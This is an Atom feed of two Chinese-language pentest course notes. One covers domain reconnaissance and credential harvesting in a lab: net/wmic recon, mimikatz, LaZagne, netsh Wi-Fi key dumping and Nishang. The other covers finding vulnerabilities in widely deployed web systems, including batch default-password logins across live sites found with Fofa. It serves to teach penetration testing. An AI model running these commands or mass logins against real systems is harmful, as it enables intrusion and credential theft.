<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HVVL404</title>
  
  
  <link href="http://blog.hvvl404.fun/atom.xml" rel="self"/>
  
  <link href="http://blog.hvvl404.fun/"/>
  <updated>2023-05-25T05:43:51.249Z</updated>
  <id>http://blog.hvvl404.fun/</id>
  
  <author>
    <name>HVVL404</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>65-内网安全-域环境&amp;工作组&amp;局域网探针方案</title>
    <link href="http://blog.hvvl404.fun/2023/05/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E6%A1%88/"/>
    <id>http://blog.hvvl404.fun/2023/05/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E6%A1%88/</id>
    <published>2023-05-24T14:20:01.894Z</published>
    <updated>2023-05-25T05:43:51.249Z</updated>
    
    <content type="html"><![CDATA[<p>65-内网安全-域环境&amp;工作组&amp;局域网探针方案</p><span id="more"></span><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-1.png" alt="65-1"></p><p><strong>一 基本认知</strong></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-2.png" alt="65-1"></p><p><strong>DMZ</strong>：</p><ul><li>英文全名“Demilitarized Zone”，中文含义是“隔离区”，在安全领域的具体含义是“内外网防火墙之间的区域”。DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。</li></ul><p><strong>工作组 VS 域环境</strong></p><ul><li>工作组：地位平等，管理分散，没有集中管理。</li><li>域环境：地位不平等，管理集中，实现集中管理。</li><li>域环境也可以简单的理解为工作组的升级版，更好管理。</li><li>这里我们把域环境和工作组区分开来是因为他们的攻击手段不同，工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</li></ul><p><strong>域控制器DC</strong>：</p><ul><li>域控DC是这个域中的管理者，域里面的最高权限，判断是否拿下整个域，就是看你是否拿下这台域控制器。</li></ul><p><strong>AD（活动目录）</strong>：</p><ul><li>是微软所提供的目录服务（查询，身份验证），活动目录的核心包含了活动目录数据库，在活动目录数据库中包含了域中所有的对象（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server  以及Windows Datacenter Server的目录服务。Active  Directory储存了有关网络对象的信息，并且让管理员和用户能够轻松的查找和使用这些信息，Active  Directory使用了一种结构化的数据储存方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</li></ul><p><strong>linux域渗透问题：</strong></p><ul><li>Q：AD域控制器只在windows server系统能做吗？Linux可以？</li><li>A：linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，个人认为Linux还是比较适合做服务器好一点。（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）</li></ul><p><strong>局域网技术适用问题：</strong></p><ul><li>不同的攻击技术手段适用面不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。</li></ul><p><strong>大概内网安全流程问题：</strong></p><ul><li>熟悉基础概念-信息收集-后续探针-权限提升-横向渗透-权限维持</li></ul><p><strong>二 案例演示</strong></p><p>本课重点</p><ul><li>案例1：基本信息收集操作演示</li><li>案例2：网络信息收集操作演示</li><li>案例3：用户信息收集操作演示</li><li>案例4：凭据信息收集操作演示</li><li>案例5：探针主机域控架构服务操作演示</li></ul><p><strong>环境介绍</strong></p><p>下图属于单域环境，Windows2008R2作为域控DC，有五个域成员主机，fileserver文件服务器、SqlServer数据库服务器、webserver网站服务器和两台个人PC。他们都是在192.168.3.0这个网段，网站服务器有两个网卡，一个在3.31一个在230.131，这个230.133就好比是它的一个对外出口（外网接口），kali攻击机就好比攻击者，它通过230.131这个接口进入网站服务器计算机，由于这台计算机是处于内网连接，所有它享有3这个网段的访问权限。拿下网站服务器后的首要攻击目标就是DC！只要拿下DC，也就相当于同时拿下了所有域成员主机权限。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-3.png" alt="65-1"></p><p><strong>案例1：基本信息收集操作演示</strong></p><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备。</p><p>服务器角色就是这台服务器是干嘛的，它在内网中扮演什么角色，比如mary-pc就是个人办公电脑，SqlServer就是数据库服务器，每台服务器都是有一个角色的，是仅仅个人用，还是用来文件传输？用来dns解析？</p><p>假设已经拿下了一台内网服务器webserver：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息（操作系统版本、补丁编号等信息）</span><br><span class="line">net start 启动服务（查看当前主机开启了哪些服务，从服务中就可以判断它是什么角色）</span><br><span class="line">tasklist 进程列表（查看当前主机开启了哪些进程）</span><br><span class="line">schtasks 计划任务（若报错无法加载列资源，说明你的权限不够，因此要提权才能使用该命令）</span><br></pre></td></tr></table></figure><p><strong>案例2：网络信息收集操作演示</strong></p><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 判断存在域-最简单方式查看主DNS后缀</span><br><span class="line">net view /domain 判断存在域</span><br><span class="line">net time /domain 判断主域（主域就是域控的意思）【在域环境下查看当前时间】</span><br><span class="line">nslookup &lt;域控制器全名&gt; 追踪来源地址</span><br><span class="line">netstat -ano 当前网络端口开放</span><br></pre></td></tr></table></figure><p>&lt;1&gt;ipconfig &#x2F;all 查看主DNS后缀，这就是当前最简单最直接判断当前服务器是域环境还是单纯的工作组局域网环境！有域的话会有主DNS，因为在域环境里面通常会由DNS解析服务器。这是第一个判断标准。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-4.png" alt="65-1"></p><p>&lt;2&gt;net view &#x2F;domain 判断存在域</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-5.png" alt="65-1"></p><p>&lt;3&gt;net time &#x2F;domain 判断主域（主域就是域控的意思）【在域环境下查看当前时间】</p><p>net time &#x2F;domain 可以判断主域，是因为域成员计算机的时间一般会以域控制器为准，所以当执行net time  &#x2F;domain命令时，该计算机会去域控获取时间，此时返回的OWA2010CN-God.god.org就是域控的计算机全名。然后可以通过nslookup来最终确认域控IP。</p><p>每一台计算机名字都是基于域名下面生成的（如SqlServer.god.org），另外，如果找到了god.org、sqlserver.god.org、xiaodi.sqlserver.god.org之类的计算机全名，说明当前环境存在多域，sqlserver.god.org是父域，xiaodi.sqlserver.god.org是子域。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-6.png" alt="65-1"></p><p>&lt;4&gt;nslookup &lt;域控制器全名&gt; 追踪来源地址</p><p>OWA2010CN-God.god.org就是域控的计算机全名，我们可以通过nslookup和ping命令去ping这个名字来获取域控的对应ip地址。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-7.png" alt="65-1"></p><p>&lt;5&gt;netstat -ano 查看当前网络端口开放</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-8.png" alt="65-1"></p><p><strong>案例3：用户信息收集操作演示</strong></p><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><p>系统默认常见用户身份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Domain Admains：域管理员（默认对域控制器有完全控制权）</span><br><span class="line">Domain Computers：域内机器</span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line">Domain users：域用户</span><br><span class="line">Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权）</span><br><span class="line"> </span><br><span class="line">我们主要攻击Domain Admains和Enterprise Admains</span><br><span class="line">大部分成员主机在Domain users域用户里</span><br></pre></td></tr></table></figure><p>相关用户收集操作命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 当前电脑里面的用户（本地用户）</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 当前域里面的用户</span><br><span class="line">net group /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br></pre></td></tr></table></figure><p>收集用户信息的作用：</p><ul><li>先找到域用户名，为后续进行密码账号的攻击做准备，后续攻击是可以用这些真实的用户名套用密码字典进行暴力破解，一旦找到对应的密码就可以登录计算机进行后续操作。看看用户名在哪个组，我就有什么权限。</li></ul><p>&lt;1&gt;net user 获取当前电脑里面的用户（本地用户），对于本地用户，当前计算机可通过用户名密码登录。</p><p>net user &#x2F;domain 获取当前域里面的用户，对于域用户，当前计算机是否可登录，受活动目录限制，若权限不够，是不能登录的。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-9.png" alt="65-1"></p><p>&lt;2&gt;net localgroup 本地用户组</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-10.png" alt="65-1"></p><p>&lt;3&gt;net group &#x2F;domain 获取域用户组信息</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-11.png" alt="65-1"></p><p>&lt;4&gt;wmic useraccount get &#x2F;all 涉及域用户详细信息</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-12.png" alt="65-1"></p><p>&lt;5&gt;net group “Domain Admins” &#x2F;domain 查询域管理员账户</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-13.png" alt="65-1"></p><p>&lt;6&gt;net group “Domain users” &#x2F;domain 查询域用户</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-14.png" alt="65-1"></p><p><strong>案例4：凭据信息收集操作演示（非常重要）</strong></p><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">计算机用户HASH，明文获取   -mimikatz（win），mimipenguin（linux）</span><br><span class="line">计算机各种协议服务口令获取   -LaZagne（all,win&amp;linux），XenArmor（win）</span><br><span class="line"> </span><br><span class="line">Netsh WLAN show profiles  //查询所有连接过的wifi名称</span><br><span class="line">Netsh WLAN show profile name =&quot;无线名称&quot; key =clear  //查询某wifi密码</span><br><span class="line"> </span><br><span class="line">获取凭据的方法：</span><br><span class="line">1.站点源码备份文件，数据库备份文件等</span><br><span class="line">2.各类数据库WEB管理入口，如PHPmyadmin</span><br><span class="line">3.浏览器保存密码，浏览器cookies</span><br><span class="line">4.其他用户会话，3389和ipc$连接记录，回收站内容</span><br><span class="line">5.windows 保存的WIFI密码</span><br><span class="line">6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</span><br></pre></td></tr></table></figure><p>人能够记住的密码有限，所以一般用户习惯给很多网站、服务等设置相同的或者类似的密码，所以当你找到了一个密码，其他密码很有可能被猜解到。</p><p>1、获取计算机用户名密码 mimikatz &amp; mimipenguin</p><ul><li>mimikatz下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li><li>mimipenguin下载：<a href="https://github.com/huntergregal/mimipenguin/releases/">https://github.com/huntergregal/mimipenguin/releases/</a></li></ul><p>新版mimikatz貌似运行有问题，下面是旧版运行结果，获取到了明文密码。注意：mimikatz运行需要域管理员权限，域用户无法运行，因为权限不够。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-15.png" alt="65-1"></p><p>同样，mimipenguin运行需要root权限，普通用户无法运行。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-16.png" alt="65-1"></p><p>2、获取计算机各种协议服务口令 LaZagne（all,win&amp;linux） &amp; XenArmor（win）</p><p>LaZagne</p><ul><li>优点：免费；自动化脚本；支持win&amp;linux</li><li>缺点：很多密码都获取不到，不好用</li><li>下载：<a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-17.png" alt="65-1"></p><p>XenArmor</p><ul><li>国外软件，价格40-50美元，网上可能有破解版，不过是老版</li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-18.png" alt="65-1"></p><p>这两个软件主要是通过自动化翻找以下内容，从而获取凭据。</p><ul><li>1.站点源码备份文件，数据库备份文件等</li><li>2.各类数据库WEB管理入口，如PHPmyadmin</li><li>3.浏览器保存密码，浏览器cookies</li><li>4.其他用户会话，3389和ipc$连接记录，回收站内容</li><li>5.windows 保存的WIFI密码</li><li>6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</li></ul><p><strong>案例5-探针主机域控架构服务操作演示</strong></p><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、探针域控制器名及地址信息</span><br><span class="line">net time /domain</span><br><span class="line">nslookup &lt;域控名称&gt;</span><br><span class="line">ping &lt;域控名称&gt;</span><br><span class="line">  </span><br><span class="line">2、探针域内存活主机及地址信息</span><br><span class="line">nbtscan 192.168.3.0/24 第三方工具（老牌工具，说实在没必要用这个工具，不强大！不免杀！）</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL =&quot; 自带内部命令（推荐使用）</span><br><span class="line">其他：nmap，masscan，第三方Powershell脚本nishang、empire等（个人喜欢NiShang）</span><br></pre></td></tr></table></figure><p>nbtscan下载：<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a></p><p>NiShang简介：</p><p>Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。（类似于MSF）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;下载NiShang：https://github.com/samratashok/nishang</span><br><span class="line">&lt;2&gt;进入目录，执行以下命令</span><br><span class="line">Import-Module ./nishang.psml        导入模块nishang</span><br><span class="line">set-ExecutionPolicy RemoteSigned    设置执行策略</span><br><span class="line">Get-Command -Module nishang     获取模块nishang的命令函数（有很多命令函数分别执行不同功能，比如以下命令）</span><br><span class="line">Get-information             获取常规计算机信息</span><br><span class="line">Invoke-Mimikatz             获取计算机用户名密码</span><br><span class="line">Invoke-Portscan -startaddress 192.168.3.0 -Endaddress 192.168.3.100 -ResolveHost -ScanPort  端口扫描（查看目录对应文件有演示语法，其他同理）</span><br><span class="line">其他功能：删除补丁，反弹shell，凭据获取等</span><br></pre></td></tr></table></figure><p>探针域内主机角色及服务信息</p><ul><li>利用开放端口服务及计算机名判断</li><li>核心业务机器：<ul><li>1.高级管理人员，系统管理员，财务&#x2F;人事、业务人员的个人计算机</li><li>2.产品管理系统服务器</li><li>3.办公系统服务器</li><li>4.财务应用系统服务器</li><li>5.核心产品源码服务器</li><li>6.数据库服务器</li><li>7.文件或者网盘服务器</li><li>8.电子邮件服务器</li><li>9.网络监控系统服务器</li><li>10.其他服务器（内部技术文档服务器，其他监控服务器）</li></ul></li></ul><p>其他涉及资源：</p><ul><li><a href="https://nagareshwar.securityxploded.com/download-softwares/">https://nagareshwar.securityxploded.com/download-softwares/</a></li><li><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></li><li>红队实战演练环境：<a href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码: taqu</li></ul><p>参考：<br><a href="https://blog.csdn.net/Waffle666/article/details/120157352">https://blog.csdn.net/Waffle666/article/details/120157352</a><br><a href="https://baijiahao.baidu.com/s?id=1697474162209043682&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1697474162209043682&amp;wfr=spider&amp;for=pc</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;65-内网安全-域环境&amp;amp;工作组&amp;amp;局域网探针方案&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全（内网篇）" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/"/>
    
    
  </entry>
  
  <entry>
    <title>88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%8B%BF%E4%B8%8BCNVD%E8%AF%81%E4%B9%A6%E5%BC%80%E6%BA%90&amp;%E9%97%AD%E6%BA%90&amp;%E5%94%AE%E5%8D%96%E7%B3%BB%E7%BB%9F/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%8B%BF%E4%B8%8BCNVD%E8%AF%81%E4%B9%A6%E5%BC%80%E6%BA%90&amp;%E9%97%AD%E6%BA%90&amp;%E5%94%AE%E5%8D%96%E7%B3%BB%E7%BB%9F/</id>
    <published>2023-05-23T15:27:29.466Z</published>
    <updated>2023-05-23T15:41:36.870Z</updated>
    
    <content type="html"><![CDATA[<p>思维导图</p><p>图片</p><p><strong>知识点：通用漏洞：100+ip部署该系统</strong></p><p>1、通用漏洞分类：开源系统、闭源系统、售卖系统</p><ul><li><p>分类、解释、区别</p></li><li><ul><li>开源系统：可以拿到源码</li><li>闭源系统：一般拿不到源码</li><li>售卖系统：可能拿到源码，也可能拿不到</li></ul></li></ul><p>2、如何寻找上述三类系统并进行安全测试</p><ul><li>开源：各大源码站下载代码审计</li><li>闭源：Fofa搜索尝试获取源码审计或黑盒测试</li><li>售卖：套路社工获取源码或购买源码审计或黑盒测试</li><li>确定无源码的情况下，可利用JS文件寻找测试接口</li></ul><p>3、如何挑简单的入手最快速度获取证书</p><ul><li>目前Java难度最大，py项目较少，挑php，aspx入手</li><li>其中php代码清晰明了，前期讲过，aspx涉及反编译代码后审计。</li></ul><p><strong>知识点：部分web源码获取</strong></p><p>1、常见的Web源码泄漏漏洞及其利用</p><ul><li><p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p></li><li><p>Web源码泄露的漏洞：</p></li><li><ul><li>git源码泄露</li><li>svn源码泄露</li><li>hg源码泄漏</li><li>网站备份压缩文件</li><li>WEB-INF&#x2F;web.xml 泄露</li><li>DS_Store 文件泄露</li><li>SWP 文件泄露</li><li>CVS泄露</li><li>Bzr泄露</li><li>GitHub源码泄漏</li></ul></li></ul><p>2、黑白源码站的利用价值、存在意义、区分对待</p><p>技术点：各种语言代码审计，无源码除常规安全测试外，js下的测试口等</p><p><strong>案例1：某开源逻辑审计配合引擎实现通用</strong></p><p>1.尝试逻辑测试</p><p>&lt;1&gt;在源码网站下载一个PHP源码，找一个人气比较高的</p><p>图片</p><p>&lt;2&gt;在挖漏洞之前，确定一下该系统的影响范围。</p><p>图片</p><p>在fofa上搜索一下关键词（这里选的是后台地址），发现了178条匹配结果，说明影响范围100+，可以挖一下。</p><p>图片</p><p>换个关键词搜索，搜出来的结果更多</p><p>图片</p><p>&lt;3&gt;本地安装运行一下</p><p>图片</p><p>&lt;4&gt;在安装过程中发现一个逻辑漏洞，安装过程中系统并未让用户手动配置后台用户名密码，说明系统的后台用户名密码是默认的，admin&#x2F;admin123，这样造成的后果是，总有粗心的管理员后续忘记修改后台默认密码。</p><p>&lt;5&gt;使用python脚本批量爬一下，网上有多少网站使用了该系统</p><p>脚本</p><p>图片</p><p>结果</p><p>图片</p><p>&lt;6&gt;再写一个python脚本，使用默认密码，批量登录这些网站的后台，看是否登录成功。登录成功则存在弱口令。</p><p>脚本</p><p>图片</p><p>结果</p><p>可以随便取一个结果在浏览器中登录一下试试。</p><p>2.尝试漏洞挖掘</p><p>&lt;7&gt;再挖个漏洞看看，将源码放到seay系统中，自动审计一下试试</p><p>有些漏洞位置在后台目录下，这些漏洞的利用前提是需要后台权限，意义不大，可忽略</p><p>图片</p><p>&lt;8&gt;代码审计，发现一个SQL注入漏洞</p><p>图片</p><p>图片</p><p>图片</p><p><strong>案例2：某闭源审计或黑盒配合引擎实现通用</strong></p><p>&lt;1&gt;在源码网站下载一个.net源码，找一个人气比较高的</p><p>图片</p><p>&lt;2&gt;在源码的bin目录下有很多dll文件，使用dnSpy工具打开这些dll文件即可查看其源码，接下来审计源码即可。</p><ul><li>dnSpy-net-win32.zip下载：<a href="https://fletime.lanzoux.com/iDxcCj60qlc">https://fletime.lanzoux.com/iDxcCj60qlc</a></li><li>dnSpy-net-win64.zip下载：<a href="https://fletime.lanzoux.com/iP8sCj60scf">https://fletime.lanzoux.com/iP8sCj60scf</a></li><li>dnSpy-netframework.zip下载：<a href="https://fletime.lanzoux.com/i3kGmj5yqwb">https://fletime.lanzoux.com/i3kGmj5yqwb</a></li></ul><p>图片</p><p>图片</p><p><strong>案例3：某售卖审计或黑盒配合引擎实现通用</strong></p><p>通用步骤：</p><p>1.尝试性获取源码</p><p>2.类似java或.net编译类文件反编译源码-dnspy,idea</p><p>3.无源码情况下的JS接口数据提交测试模拟-jsdinder,手工，扫描</p><p>案例演示</p><p>&lt;1&gt;搜索一个系统</p><p>图片</p><p>图片</p><p>&lt;2&gt;这个系统无源码，也不知道是个啥系统，怎么测试呢？除了以前学过的常规黑盒测试外，还可以这么测</p><p>使用jsfinder工具，扫描js文件，爬取系统中的一些地址，从而获取更多信息，扩大测试范围</p><ul><li>JSFinder下载：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li></ul><p>图片</p><p>还可以御剑配合字典扫描js目录</p><p>字典</p><ul><li>fuzzDicts下载：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li></ul><p>图片</p><p>图片</p><p>注意：以上均是思路演示，不可以真的拿真实系统去测，要做一个遵纪守法好公民！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;思维导图&lt;/p&gt;
&lt;p&gt;图片&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;知识点：通用漏洞：100+ip部署该系统&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、通用漏洞分类：开源系统、闭源系统、售卖系统&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;分类、解释、区别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ul&gt;
&lt;l</summary>
      
    
    
    
    <category term="小迪安全（SRC挖掘）" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/"/>
    
    
  </entry>
  
  <entry>
    <title>86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</title>
